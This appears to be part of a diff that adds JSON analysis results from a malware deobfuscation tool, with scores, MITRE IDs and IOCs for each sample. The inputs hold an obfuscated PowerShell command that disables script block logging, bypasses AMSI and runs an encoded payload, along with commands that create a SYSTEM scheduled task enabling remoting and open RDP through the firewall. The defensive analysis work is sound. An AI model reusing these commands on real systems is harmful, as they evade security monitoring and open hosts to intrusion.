n",
+    "input_len": 4188,
+    "engine": "archetype:PS_EncodedCommand+magic",
+    "chain": [
+      "extract-b64",
+      "utf16le-or-utf8-decode",
+      "extract-payload"
+    ],
+    "score": 45,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1059.001",
+      "T1027.010",
+      "T1059.003",
+      "T1027"
+    ],
+    "lolbins": [
+      "powershell.exe",
+      "cmd.exe"
+    ],
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "gMe+uaPuYdmH8mPJ0SboFA==",
+    "post_proc": {}
+  },
+  {
+    "name": "Corrupted_Gzip",
+    "input": "\"-noni -nop -w hidden -c $smrA=((''+'E'+'n{0}b'+'leSc'+'ri{2'+'}tBloc{3}{1}ogging')-f'a','L','p','k');If($PSVersionTable.PSVersion.Major -ge 3){ $fLW8W=(('Sc'+'ri'+'pt{0}{2}ock'+'Log'+'gi{1}g')-f'B','n','l'); $zeXlF=[Ref].Assembly.GetType((('{'+'2}{'+'3}stem'+'.Ma'+'na{1}'+'e'+'ment.{4}{0}tomation.'+'Uti{5}s')-f'u','g','S','y','A','l')); $sUr=[Collections.Generic.Dictionary[string,System.Object]]::new(); $ar=[Ref].Assembly.GetType((('{2'+'}{1}'+'ste'+'m'+'{'+'9'+'}'+'{4}'+'a'+'n'+'a'+'{5}em'+'ent{'+'9'+'}{7'+'}{6}t'+'{8}mati{8}n'+'{9}{7'+'}msi{'+'3}t'+'i{0}s')-f'l','y','S','U','M','g','u','A','o','.')); $s9G=(('Ena{3}l'+'{4}Scri'+'pt{'+'0}l'+'oc'+'{2}{1}n{5}'+'ocation'+'Logging')-f'B','I','k','b','e','v'); $jjrP=$zeXlF.GetField('cachedGroupPolicySettings','NonPublic,Static'); if ($ar) { $ar.GetField(((''+'am{4}i{'+'1}'+'nit{0}a'+'i{2'+'}e{'+'3'+'}'+'')-f'F','I','l','d','s'),'NonPublic,Static').SetValue($null,$true); }; If ($jjrP) { $ksL=$jjrP.GetValue($null); $sUr.Add($smrA,0); $sUr.Add($s9G,0); $ksL['HKEY_LOCAL_MACHINE\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\'+$fLW8W]=$sUr; If($ksL[$fLW8W]){ $ksL[$fLW8W][$s9G]=0; $ksL[$fLW8W][$smrA]=0; } } Else { [Ref].Assembly.GetType((('S{4'+'}stem.Ma'+'na{0}emen'+'t.{3}u'+'tom'+'ation'+'.Sc{1}i'+'{2}tB{'+'5}ock')-f'g','r','p','A','y','l')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIACyzuWgCA7VW+2/aSBD+vVL/B6tCsq0SbB5tHlKlW5tnA8TgAAGKTou9mG3WXmIvIaTX//1mwQ6JSu5yJ'+'9VSwj5mZm{0}/+WZmF+vIE5{1}HysNjS/nx/p2Sfg6OcahoufnEauSVXPxI9cNmbvN13g6VL4o2{1}'+'atVlY{0}Y{1}rOLC3sdxyQS+3mhQQ{1}KEhLOGSWJpit/KaMlicnJ1fw78YTyQ8n9WWgwPscsFdva2FsS5Q{1}Fvtxrcw9LzwruilGhqd++qfr0pDgr1O7WmCWa6m4TQcKCz5iqKz91{0}{0}D1dkU0tUO9mCd8IQojGpVLhUGU4AXpgrV70iFiyf1Ehdsc7hMTsY6j9FrSzl5KU2HoxNxDvh+TJFHzylS{0}MJ3N/tCm6fH9dS{1}oSAqtSJCYr1wS31OPJIUmjnxG+mQxAy1XxDQKZroOYvf8lmi5a'+'M1YXvkvZrQu2WTgvV'+'VJ{0}64EUo6I9TxE9dhFO9xfM7JXVY94uqOCDl9KB0Dwpw{'+'1}xkTGIPqAjDDosZN90t0PAZc3hCd'+'3pflHMvNKBs7Hg8{1}amu{0}t4TfTZE+BKji7yb7VVzB{1}B7dE+g5XpkFN/dtB/Ef5cWJMir1O5ShY0ItVthEPqZWzVjgWELBjZoVHIxLrgnqamG8SvEkYCLCTCkh{0}/qNVCKp50rTVlPom{1}B0FNwCuIt/7SmX3QNLUVdU'+'gIyO3nQNTcAnKEZNJpXmyz0+UchFSb4STJK84aktTLKy7BjPh5BUUJTbfQWvDdUD2421kzQT2ciMzcTH8BZnqoz'+'aNExGsPIgoAXLsr4lHMJB55pUl9Ym1dGmSHq0f{1}sDFjkDhg'+'6{1}6iASsSBVdInsTgJ3BCL7hEtMIVIyFI7ApGn{0}EAykOaHDta4YD46lEnswTYs11ikoHxzEUItMu4yCtDGgsoPhJf4NX/cODXmgO{0}2DFJ'+'Y6JlSTW1tkLSPi{0}EpGaKzA6HWAAG9ZiHFk7I58q+tGgfjCvqIPjG1aY7aQm304oYLbY68DfoLM4cYfKQllu849mJ06ifIboJNt5Z'+'F3n+V5+cu8OKcGstYTuo2aOmVVl6lnktx8UgQH4X1oLx0mOmUwvb3VZiFb83DWlrb8OrVJo3JiqXK1dl8xaAG4P{0}L{0}iFdPPQhjHU0Ku2B'+'Xpmi9W+2v35qFSfjFjTqNSXixFP3M/jqmEY5z6udrYIWdwvd7Y3xT6/bnqhVYm4cW5XblENITuqD{'+'0}sWv'+'xxbMXKMIQ5WPLYsCEFgI9Q4pWTSG9StXq9uoUHj+1313AiM89ENXlqjYY'+'lOVjf9Jc'+'zrm2bv0jArLZ888'+'skGgGtwhIM+yA{1}2yVsuQKb6EVkfuzwp4VuLIwtk6pM71FiOV3WHwf71oMT{1}kHVvMGpPtnXDKI6dCmqafNQIUA/EcWD1MEruq49Vozj0uT/61B0vjOENOzWqds9Z3sg7G6tQ/t80q5f{0}pLjxrk4rlnlnhz{1}k85JvnA/OrGhzGTj3gd8bnfYfuts5nDswjOEHoMt0QCN{1}Ls1yvH8qy+j7d7mHT5+fk{0}a1JtHBcbLEDMgExT/L5DqP62k9dziVGpomXwa3JI4Ig14K3TbLAsQY9'+'2Q7kYUfOtm+v8h2N2jtXDo20pUnQf3QZLKli4sJ+Ah5JUShTaJALPPmQ9k0oTmYD2Zll0Bvv5fNV1sNTOVlc5Go7A2znWGw{1}{1}{0}Kpv12mOABIaCcvQrUa5jBybdQgKAa7iuD{1}M7inD3HbX+pJwocUAO4inDpqX'+'w4SGaA9gm5g+vLrvq8S+fu2wj9Vrak1W0JP/6/sOWw9g+7b2KQmd9B88vqy4VnH{0}H33X'+'+EqQBBF6o0I/vnwlEY0vx4FlwZGuD/Iv3kE/pqLU668CDbtYm/ASvpaGW8CwAA')-f'e','R')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\",",
+    "input_len": 3671,
+    "engine": "smart+magic",
+    "chain": [
+      "extract-b64-concat",
+      "base64-decode",
+      "gzip-decompress"
+    ],
+    "score": 0,
+    "verdict": "Corrupted",
+    "mitre": [
+      "T1059.001",
+      "T1140"
+    ],
+    "lolbins": [],
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "domains": [
+        "stem.ma"
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "[GZIP_CORRUPT] error: Error -3 while decompressing data: invalid bit length repeat \u2014 aggressive salvage disabled.",
+    "post_proc": {}
+  },
+  {
+    "name": "Need Layered Detonation",
+    "input": "\"-noni -nop -w hidden -c $smrA=((''+'E'+'n{0}b'+'leSc'+'ri{2'+'}tBloc{3}{1}ogging')-f'a','L','p','k');If($PSVersionTable.PSVersion.Major -ge 3){ $fLW8W=(('Sc'+'ri'+'pt{0}{2}ock'+'Log'+'gi{1}g')-f'B','n','l'); $zeXlF=[Ref].Assembly.GetType((('{'+'2}{'+'3}stem'+'.Ma'+'na{1}'+'e'+'ment.{4}{0}tomation.'+'Uti{5}s')-f'u','g','S','y','A','l')); $sUr=[Collections.Generic.Dictionary[string,System.Object]]::new(); $ar=[Ref].Assembly.GetType((('{2'+'}{1}'+'ste'+'m'+'{'+'9'+'}'+'{4}'+'a'+'n'+'a'+'{5}em'+'ent{'+'9'+'}{7'+'}{6}t'+'{8}mati{8}n'+'{9}{7'+'}msi{'+'3}t'+'i{0}s')-f'l','y','S','U','M','g','u','A','o','.')); $s9G=(('Ena{3}l'+'{4}Scri'+'pt{'+'0}l'+'oc'+'{2}{1}n{5}'+'ocation'+'Logging')-f'B','I','k','b','e','v'); $jjrP=$zeXlF.GetField('cachedGroupPolicySettings','NonPublic,Static'); if ($ar) { $ar.GetField(((''+'am{4}i{'+'1}'+'nit{0}a'+'i{2'+'}e{'+'3'+'}'+'')-f'F','I','l','d','s'),'NonPublic,Static').SetValue($null,$true); }; If ($jjrP) { $ksL=$jjrP.GetValue($null); $sUr.Add($smrA,0); $sUr.Add($s9G,0); $ksL['HKEY_LOCAL_MACHINE\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\'+$fLW8W]=$sUr; If($ksL[$fLW8W]){ $ksL[$fLW8W][$s9G]=0; $ksL[$fLW8W][$smrA]=0; } } Else { [Ref].Assembly.GetType((('S{4'+'}stem.Ma'+'na{0}emen'+'t.{3}u'+'tom'+'ation'+'.Sc{1}i'+'{2}tB{'+'5}ock')-f'g','r','p','A','y','l')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIACyzuWgCA7VW+2/aSBD+vVL/B6tCsq0SbB5tHlKlW5tnA8TgAAGKTou9mG3WXmIvIaTX//1mwQ6JSu5yJ'+'9VSwj5mZm{0}/+WZmF+vIE5{1}HysNjS/nx/p2Sfg6OcahoufnEauSVXPxI9cNmbvN13g6VL4o2{1}'+'atVlY{0}Y{1}rOLC3sdxyQS+3mhQQ{1}KEhLOGSWJpit/KaMlicnJ1fw78YTyQ8n9WWgwPscsFdva2FsS5Q{1}Fvtxrcw9LzwruilGhqd++qfr0pDgr1O7WmCWa6m4TQcKCz5iqKz91{0}{0}D1dkU0tUO9mCd8IQojGpVLhUGU4AXpgrV70iFiyf1Ehdsc7hMTsY6j9FrSzl5KU2HoxNxDvh+TJFHzylS{0}MJ3N/tCm6fH9dS{1}oSAqtSJCYr1wS31OPJIUmjnxG+mQxAy1XxDQKZroOYvf8lmi5a'+'M1YXvkvZrQu2WTgvV'+'VJ{0}64EUo6I9TxE9dhFO9xfM7JXVY94uqOCDl9KB0Dwpw{'+'1}xkTGIPqAjDDosZN90t0PAZc3hCd'+'3pflHMvNKBs7Hg8{1}amu{0}t4TfTZE+BKji7yb7VVzB{1}B7dE+g5XpkFN/dtB/Ef5cWJMir1O5ShY0ItVthEPqZWzVjgWELBjZoVHIxLrgnqamG8SvEkYCLCTCkh{0}/qNVCKp50rTVlPom{1}B0FNwCuIt/7SmX3QNLUVdU'+'gIyO3nQNTcAnKEZNJpXmyz0+UchFSb4STJK84aktTLKy7BjPh5BUUJTbfQWvDdUD2421kzQT2ciMzcTH8BZnqoz'+'aNExGsPIgoAXLsr4lHMJB55pUl9Ym1dGmSHq0f{1}sDFjkDhg'+'6{1}6iASsSBVdInsTgJ3BCL7hEtMIVIyFI7ApGn{0}EAykOaHDta4YD46lEnswTYs11ikoHxzEUItMu4yCtDGgsoPhJf4NX/cODXmgO{0}2DFJ'+'Y6JlSTW1tkLSPi{0}EpGaKzA6HWAAG9ZiHFk7I58q+tGgfjCvqIPjG1aY7aQm304oYLbY68DfoLM4cYfKQllu849mJ06ifIboJNt5Z'+'F3n+V5+cu8OKcGstYTuo2aOmVVl6lnktx8UgQH4X1oLx0mOmUwvb3VZiFb83DWlrb8OrVJo3JiqXK1dl8xaAG4P{0}L{0}iFdPPQhjHU0Ku2B'+'Xpmi9W+2v35qFSfjFjTqNSXixFP3M/jqmEY5z6udrYIWdwvd7Y3xT6/bnqhVYm4cW5XblENITuqD{'+'0}sWv'+'xxbMXKMIQ5WPLYsCEFgI9Q4pWTSG9StXq9uoUHj+1313AiM89ENXlqjYY'+'lOVjf9Jc'+'zrm2bv0jArLZ888'+'skGgGtwhIM+yA{1}2yVsuQKb6EVkfuzwp4VuLIwtk6pM71FiOV3WHwf71oMT{1}kHVvMGpPtnXDKI6dCmqafNQIUA/EcWD1MEruq49Vozj0uT/61B0vjOENOzWqds9Z3sg7G6tQ/t80q5f{0}pLjxrk4rlnlnhz{1}k85JvnA/OrGhzGTj3gd8bnfYfuts5nDswjOEHoMt0QCN{1}Ls1yvH8qy+j7d7mHT5+fk{0}a1JtHBcbLEDMgExT/L5DqP62k9dziVGpomXwa3JI4Ig14K3TbLAsQY9'+'2Q7kYUfOtm+v8h2N2jtXDo20pUnQf3QZLKli4sJ+Ah5JUShTaJALPPmQ9k0oTmYD2Zll0Bvv5fNV1sNTOVlc5Go7A2znWGw{1}{1}{0}Kpv12mOABIaCcvQrUa5jBybdQgKAa7iuD{1}M7inD3HbX+pJwocUAO4inDpqX'+'w4SGaA9gm5g+vLrvq8S+fu2wj9Vrak1W0JP/6/sOWw9g+7b2KQmd9B88vqy4VnH{0}H33X'+'+EqQBBF6o0I/vnwlEY0vx4FlwZGuD/Iv3kE/pqLU668CDbtYm/ASvpaGW8CwAA')-f'e','R')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\",",
+    "input_len": 3671,
+    "engine": "smart+magic",
+    "chain": [
+      "extract-b64-concat",
+      "base64-decode",
+      "gzip-decompress"
+    ],
+    "score": 0,
+    "verdict": "Corrupted",
+    "mitre": [
+      "T1059.001",
+      "T1140"
+    ],
+    "lolbins": [],
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "domains": [
+        "stem.ma"
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "[GZIP_CORRUPT] error: Error -3 while decompressing data: invalid bit length repeat \u2014 aggressive salvage disabled.",
+    "post_proc": {}
+  },
+  {
+    "name": "Test Case",
+    "input": "powershell -e ABC",
+    "input_len": 17,
+    "engine": "magic",
+    "chain": [],
+    "score": 75,
+    "verdict": "Undecoded",
+    "mitre": [
+      "T1059.001"
+    ],
+    "lolbins": [
+      "powershell.exe"
+    ],
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "",
+    "post_proc": {}
+  },
+  {
+    "name": "Case1",
+    "input": "/s vmch45.sugarlandtx.gov /tn MsedgeUpdate /tr \\\"powershell.exe Enable-PSRemoting -force\\\" /sc ONCE /st 00:00 /ru SYSTEM\n/f, advfirewall firewall add rule name=RDP protocol=TCP localport=3389 action=allow dir=IN",
+    "input_len": 211,
+    "engine": "magic",
+    "chain": [],
+    "score": 64,
+    "verdict": "Undecoded",
+    "mitre": [
+      "T1021.006"
+    ],
+    "lolbins": [],
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "domains": [
+        "vmch45.sugarlandtx.gov"
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "",
+    "post_proc": {}
+  }
+]
